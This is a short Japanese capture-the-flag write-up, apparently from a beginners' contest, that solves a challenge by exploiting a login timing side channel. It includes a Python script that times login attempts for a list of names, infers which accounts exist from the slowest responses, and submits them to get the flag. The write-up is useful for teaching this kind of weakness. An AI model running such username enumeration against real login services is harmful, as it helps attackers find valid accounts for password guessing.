アカウントが存在する場合と存在しない場合で認証処理に時間差が発生することを利用する。

まず、下記の処理によって認証処理に時間がかかるアカウントを抽出する。

この時、処理時間が最も離れている2つのアカウント間でリストを分割し、処理時間が長い方のリストに含まれるアカウントを登録されているものとして扱う。

```python
def enumarate_accounts():
    employees = [
        "Arthur", "Barbara", "Christine", "David", "Elbert", 
        "Franklin", "George", "Harris", "Ivan", "Jane", 
        "Kevin", "Lazarus", "Marc", "Nathan", "Oliver", 
        "Paul", "Quentin", "Randolph", "Scott", "Tony", 
        "Ulysses", "Vincent", "Wat", "Ximena", "Yvonne", "Zalmon"
    ]

    T = []
    for employee in employees:
        t = time.time()
        _ = requests.post(f"http://{os.getenv('CTF4B_HOST')}:{os.getenv('CTF4B_PORT')}", {"name": f"{employee}", "password": "x"})
        consume = time.time() - t

        T.append((employee, consume))

    T.sort(key=lambda t: t[1], reverse=True)

    maxdiff = 0
    maxdiff_i = -1
    for i in range(1, len(T)):
        if abs(T[i][1] - T[i-1][1]) > maxdiff:
            maxdiff = abs(T[i][1] - T[i-1][1])
            maxdiff_i = i

    return sorted([employee for employee, consume in T[:maxdiff_i]])
```

上記の処理によって登録されたアカウントを列挙した後は、それらを選択し`/challenge`にPOSTすれば良い。

```python
def solve(accounts):
    response = requests.post(f"http://{os.getenv('CTF4B_HOST')}:{os.getenv('CTF4B_PORT')}/challenge", {"answer": accounts})
    soup = BeautifulSoup(response.text, "html.parser")
    print(f"[*] FLAG: {soup.select('#message')[0].text}")
```